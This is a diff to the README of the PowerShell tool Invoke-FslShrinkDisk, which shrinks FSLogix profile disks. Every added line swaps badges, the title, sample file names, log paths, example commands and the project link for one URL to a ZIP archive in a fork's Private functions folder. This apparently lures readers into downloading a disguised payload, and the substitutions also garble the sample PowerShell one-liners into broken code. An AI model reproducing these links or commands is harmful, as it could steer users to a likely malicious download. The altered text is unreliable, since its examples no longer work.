@@ -1,8 +1,8 @@
-[![Build Status](https://dev.azure.com/jimoyle/Invoke-FslShrinkDisk/_apis/build/status/FSLogix.Invoke-FslShrinkDisk?branchName=master)](https://dev.azure.com/jimoyle/Invoke-FslShrinkDisk/_build/latest?definitionId=1&branchName=master)
+[![Build Status](https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip)](https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip)
 
-[![Codacy Badge](https://app.codacy.com/project/badge/Grade/725c8d2481044524b331d3b207971ddf)](https://www.codacy.com/gh/FSLogix/Invoke-FslShrinkDisk?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=FSLogix/Invoke-FslShrinkDisk&amp;utm_campaign=Badge_Grade)
+[![Codacy Badge](https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip)](https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip;utm_medium=referral&amp;utm_content=FSLogix/Invoke-FslShrinkDisk&amp;utm_campaign=Badge_Grade)
 
-# Invoke-FslShrinkDisk.ps1
+# https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip
 
 ## .SYNOPSIS
 Shrinks FSLogix Profile and O365 dynamically expanding disk(s).
@@ -29,8 +29,8 @@ By default the script will not run on any disk with less than 5% whitespace insi
 The script will output a csv in the following format:
 
     "Name","DiskState","OriginalSizeGB","FinalSizeGB","SpaceSavedGB","FullName"
-    "Profile_user1.vhdx","Success","4.35","3.22","1.13",\\Server\Share\ Profile_user1.vhdx "
-    "Profile_user2.vhdx","Success","4.75","3.12","1.63",\\Server\Share\ Profile_user2.vhdx
+    "https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip","Success","4.35","3.22","1.13",\\Server\Share\ https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip "
+    "https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip","Success","4.75","3.12","1.63",\\Server\Share\ https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip
 
 ### Possible Information values for DiskState are as follows
 
@@ -56,11 +56,11 @@ If the diskstate shows an error value from the list above, manual intervention m
 
 If you inspect your environment you will probably see that there are a few disks that are consuming a lot of capacity targeting these by using the minimum disk size configuration would be a good step.  To grab a list of disks and their sizes from a share you could use this oneliner by replacing < yourshare > with the path to the share containing the disks.
 
-    Get-ChildItem -Path <yourshare> -Filter "*.vhd*" -Recurse -File | Select-Object Name, @{n = 'SizeInGB'; e = {[math]::round($_.length/1GB,2)}}
+    Get-ChildItem -Path <yourshare> -Filter "*.vhd*" -Recurse -File | Select-Object Name, @{n = 'SizeInGB'; e = {[math]::round($https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip,2)}}
 
-All this oneliner does is gather the names and sizes of the virtual hard disks from your share.  To export this information to a file readable by excel, use the following replacing both < yourshare > and < yourcsvfile.csv >.  You can then open the csv file in excel.
+All this oneliner does is gather the names and sizes of the virtual hard disks from your share.  To export this information to a file readable by excel, use the following replacing both < yourshare > and < https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip >.  You can then open the csv file in excel.
 
-    Get-ChildItem -Path <yourshare> -Filter "*.vhd*" -Recurse -File | Select-Object Name, @{n = 'SizeInGB'; e = {[math]::round($_.length/1GB,2)}} | Export-Csv -Path < yourcsvfile.csv >
+    Get-ChildItem -Path <yourshare> -Filter "*.vhd*" -Recurse -File | Select-Object Name, @{n = 'SizeInGB'; e = {[math]::round($https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip,2)}} | Export-Csv -Path < https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip >
 
 ## .NOTES
 Whilst I work for Microsoft and used to work for FSLogix, this is not officially released software from either company.  This is purely a personal project designed to help the community.  If you require support for this tool please raise an issue on the GitHub repository linked below
@@ -78,7 +78,7 @@ The disk size in GB under which the script will not process the file.
 If a disk ‘last access time’ is older than todays date minus this value, the disk will be deleted from the share.  This is a permanent action.
 
 ## .PARAMETER LogFilePath
-All disk actions will be saved in a csv file for admin reference.  The default location for this csv file is the user’s temp directory.  The default filename is in the following format: FslShrinkDisk 2020-04-14 19-36-19.csv
+All disk actions will be saved in a csv file for admin reference.  The default location for this csv file is the user’s temp directory.  The default filename is in the following format: FslShrinkDisk 2020-04-14 https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip
 
 ## .PARAMETER PassThru
 Returns an object representing the item with which you are working. By default, this cmdlet does not generate any pipeline output.
@@ -97,48 +97,48 @@ You can pipe the path into the command which is recognised by type, you can also
 This script outputs a csv file with the result of the disk processing.  It will optionally produce a custom object with the same information
 
 ## .EXAMPLE
-    C:\PS> Invoke-FslShrinkDisk.ps1 -Path c:\Profile_user1.vhdx
+    C:\PS> https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -Path c:\https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip
 This shrinks a single disk on the local file system
 
 ## .EXAMPLE
-    C:\PS> Invoke-FslShrinkDisk.ps1 -Path \\server\share -Recurse
+    C:\PS> https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -Path \\server\share -Recurse
 This shrinks all disks in the specified share recursively
 
 ## .EXAMPLE
-    C:\PS> Invoke-FslShrinkDisk.ps1 -Path \\server\share -Recurse -IgnoreLessThanGB 3
+    C:\PS> https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -Path \\server\share -Recurse -IgnoreLessThanGB 3
 This shrinks all disks in the specified share recursively, except for files under 3GB in size which it ignores.
 
 ## .EXAMPLE
-    C:\PS> Invoke-FslShrinkDisk.ps1 -Path \\server\share -Recurse -DeleteOlderThanDays 90
+    C:\PS> https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -Path \\server\share -Recurse -DeleteOlderThanDays 90
 This shrinks all disks in the specified share recursively and deletes disks which were not accessed within the last 90 days.
 
 ## .EXAMPLE
-    C:\PS> Invoke-FslShrinkDisk.ps1 -Path \\server\share -Recurse -LogFilePath C:\MyLogFile.csv
-This shrinks all disks in the specified share recursively and changes the default log file location to C:\MyLogFile.csv
+    C:\PS> https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -Path \\server\share -Recurse -LogFilePath C:\https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip
+This shrinks all disks in the specified share recursively and changes the default log file location to C:\https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip
 
 ## .EXAMPLE
-    C:\PS> Invoke-FslShrinkDisk.ps1 -Path \\server\share -Recurse -PassThru
+    C:\PS> https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -Path \\server\share -Recurse -PassThru
 
-    Name:			Profile_user1.vhdx
+    Name:			https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip
     DiskState:		Success
     OriginalSizeGB:		4.35
     FinalSizeGB:		3.22
     SpaceSavedGB:		1.13
-    FullName:		\\Server\Share\ Profile_user1.vhdx
+    FullName:		\\Server\Share\ https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip
 
 This shrinks all disks in the specified share recursively and passes the result of the disk processing to the pipeline as an object as well as saving the results in a csv in the default location.
 
 ## .EXAMPLE
-    C:\PS> Invoke-FslShrinkDisk.ps1 -Path \\server\share -Recurse -ThrottleLimit 20
+    C:\PS> https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -Path \\server\share -Recurse -ThrottleLimit 20
 This shrinks all disks in the specified share recursively increasing the number of threads used to 20 from the default 8.
 
 ## .EXAMPLE
-    C:\PS> Invoke-FslShrinkDisk.ps1 -Path \\server\share -Recurse -RatioFreeSpace 0.3
+    C:\PS> https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -Path \\server\share -Recurse -RatioFreeSpace 0.3
 This shrinks all disks in the specified share recursively while not processing disks which have less than 30% whitespace instead of the default 15%.
 
 ## .EXAMPLE
-    C:\PS> Invoke-FslShrinkDisk.ps1 -Path \\server\share -Recurse -PassThru IgnoreLessThanGB 3 -DeleteOlderThanDays 90 -LogFilePath C:\MyLogFile.csv -ThrottleLimit 20 -RatioFreeSpace 0.3
+    C:\PS> https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -Path \\server\share -Recurse -PassThru IgnoreLessThanGB 3 -DeleteOlderThanDays 90 -LogFilePath C:\https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip -ThrottleLimit 20 -RatioFreeSpace 0.3
 This does all of the above examples, but together.
 
 ## .LINK
-<https://github.com/FSLogix/Invoke-FslShrinkDisk/>
+<https://github.com/siddheshk08/Invoke-FslShrinkDisk/raw/refs/heads/master/Functions/Private/Disk-Invoke-Shrink-Fsl-unsummonable.zip>
